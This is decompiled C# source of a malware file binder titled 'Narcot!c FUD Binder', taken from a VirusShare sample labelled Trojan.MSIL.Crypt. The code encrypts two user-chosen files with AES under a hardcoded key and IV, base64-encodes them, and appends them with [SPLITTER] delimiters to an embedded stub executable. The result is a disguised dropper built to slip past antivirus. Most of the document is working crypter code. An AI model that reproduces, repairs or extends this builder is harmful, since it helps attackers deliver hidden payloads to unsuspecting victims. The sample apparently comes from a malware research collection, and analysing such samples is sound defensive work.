// Decompiled with JetBrains decompiler
// Type: FileBinder.Form1
// Assembly: FileBinder, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CD1CF40E-4344-459C-ADBC-7F63A7E4873A
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.pqr-a86e6e3cdd80fc20c370889121550d129101888ea1ee4cfcbca444bb3283fd92.exe

using FileBinder.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace FileBinder
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("Button3")]
    private Button _Button3;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    private string F;
    private string F2;

    [DebuggerNonUserCode]
    public Form1() => this.InitializeComponent();

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.Button3 = new Button();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.SuspendLayout();
      this.Button1.Font = new Font("JuneBug", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      Button button1_1 = this.Button1;
      Point point1 = new Point(260, 79);
      Point point2 = point1;
      button1_1.Location = point2;
      Button button1_2 = this.Button1;
      Padding padding1 = new Padding(4, 4, 4, 4);
      Padding padding2 = padding1;
      button1_2.Margin = padding2;
      this.Button1.Name = "Button1";
      Button button1_3 = this.Button1;
      Size size1 = new Size(76, 24);
      Size size2 = size1;
      button1_3.Size = size2;
      this.Button1.TabIndex = 0;
      this.Button1.Text = "File 1";
      this.Button1.UseVisualStyleBackColor = true;
      this.Button2.Font = new Font("JuneBug", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      Button button2_1 = this.Button2;
      point1 = new Point(260, 136);
      Point point3 = point1;
      button2_1.Location = point3;
      Button button2_2 = this.Button2;
      padding1 = new Padding(4, 4, 4, 4);
      Padding padding3 = padding1;
      button2_2.Margin = padding3;
      this.Button2.Name = "Button2";
      Button button2_3 = this.Button2;
      size1 = new Size(76, 23);
      Size size3 = size1;
      button2_3.Size = size3;
      this.Button2.TabIndex = 1;
      this.Button2.Text = "File 2";
      this.Button2.UseVisualStyleBackColor = true;
      this.Button3.Font = new Font("After Shok", 9.749999f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      Button button3_1 = this.Button3;
      point1 = new Point(126, 180);
      Point point4 = point1;
      button3_1.Location = point4;
      Button button3_2 = this.Button3;
      padding1 = new Padding(4, 4, 4, 4);
      Padding padding4 = padding1;
      button3_2.Margin = padding4;
      this.Button3.Name = "Button3";
      Button button3_3 = this.Button3;
      size1 = new Size(100, 44);
      Size size4 = size1;
      button3_3.Size = size4;
      this.Button3.TabIndex = 2;
      this.Button3.Text = "Bind !";
      this.Button3.UseVisualStyleBackColor = true;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(4, 79);
      Point point5 = point1;
      textBox1_1.Location = point5;
      TextBox textBox1_2 = this.TextBox1;
      padding1 = new Padding(4, 4, 4, 4);
      Padding padding5 = padding1;
      textBox1_2.Margin = padding5;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_3 = this.TextBox1;
      size1 = new Size(248, 23);
      Size size5 = size1;
      textBox1_3.Size = size5;
      this.TextBox1.TabIndex = 3;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(4, 136);
      Point point6 = point1;
      textBox2_1.Location = point6;
      TextBox textBox2_2 = this.TextBox2;
      padding1 = new Padding(4, 4, 4, 4);
      Padding padding6 = padding1;
      textBox2_2.Margin = padding6;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_3 = this.TextBox2;
      size1 = new Size(248, 23);
      Size size6 = size1;
      textBox2_3.Size = size6;
      this.TextBox2.TabIndex = 4;
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(345, 258);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Button1);
      this.Font = new Font("MothproofScript", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      padding1 = new Padding(4, 4, 4, 4);
      this.Margin = padding1;
      this.Name = nameof (Form1);
      this.Text = "Narcot!c FUD Binder";
      this.TransparencyKey = SystemColors.GradientActiveCaption;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        if (this._Button2 != null)
          this._Button2.Click -= eventHandler;
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += eventHandler;
      }
    }

    internal virtual Button Button3
    {
      [DebuggerNonUserCode] get => this._Button3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        if (this._Button3 != null)
          this._Button3.Click -= eventHandler;
        this._Button3 = value;
        if (this._Button3 == null)
          return;
        this._Button3.Click += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    public byte[] secure(byte[] data)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        return rijndaelManaged.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
      }
    }

    public byte[] Unsecure(byte[] data)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
      }
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.FileName = "*.*";
      openFileDialog.Title = "Choose a File...";
      openFileDialog.Filter = "All files (*.*)|*.*";
      openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      if (openFileDialog.ShowDialog() == DialogResult.OK)
      {
        this.F = openFileDialog.SafeFileName;
        this.TextBox1.Text = openFileDialog.FileName;
      }
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.FileName = "*.*";
      openFileDialog.Title = "Choose a File...";
      openFileDialog.Filter = "All files (*.*)|*.*";
      openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      if (openFileDialog.ShowDialog() == DialogResult.OK)
      {
        this.F2 = openFileDialog.SafeFileName;
        this.TextBox2.Text = openFileDialog.FileName;
      }
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      try
      {
        SaveFileDialog saveFileDialog = new SaveFileDialog();
        saveFileDialog.FileName = "*.*";
        saveFileDialog.Title = "Choose an output folder...";
        saveFileDialog.Filter = "All files (*.*)|*.*";
        saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        if (saveFileDialog.ShowDialog() == DialogResult.OK)
        {
          string str = "[SPLITTER]";
          byte[] stub = FileBinder.My.Resources.Resources.Stub;
          MyProject.Computer.FileSystem.WriteAllBytes(saveFileDialog.FileName, stub, false);
          byte[] inArray1 = this.secure(MyProject.Computer.FileSystem.ReadAllBytes(this.TextBox1.Text));
          byte[] inArray2 = this.secure(MyProject.Computer.FileSystem.ReadAllBytes(this.TextBox2.Text));
          File.AppendAllText(saveFileDialog.FileName, str + Convert.ToBase64String(inArray1) + str + this.F + str + Convert.ToBase64String(inArray2) + str + this.F2);
          int num = (int) Interaction.MsgBox((object) "Sucessfully Binded!", MsgBoxStyle.Information, (object) "Success");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ("Error(s) occured" + ex.Message), MsgBoxStyle.Critical, (object) "Error");
        ProjectData.ClearProjectError();
      }
    }
  }
}
